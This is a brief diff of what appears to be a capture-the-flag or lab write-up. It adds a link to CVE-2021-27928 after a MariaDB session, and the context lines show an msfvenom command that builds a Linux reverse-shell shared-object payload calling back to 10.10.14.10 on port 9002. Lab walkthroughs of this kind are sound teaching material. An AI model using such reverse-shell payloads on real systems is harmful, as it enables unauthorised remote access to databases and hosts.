@@ -326,7 +326,8 @@ MariaDB [zabbix]> exit
 exit
 Bye
 ```
-
+##cve
+https://www.cvedetails.com/cve/CVE-2021-27928/
 ```
 msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.10 LPORT=9002 -f elf-so -oexploit.so
 [-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
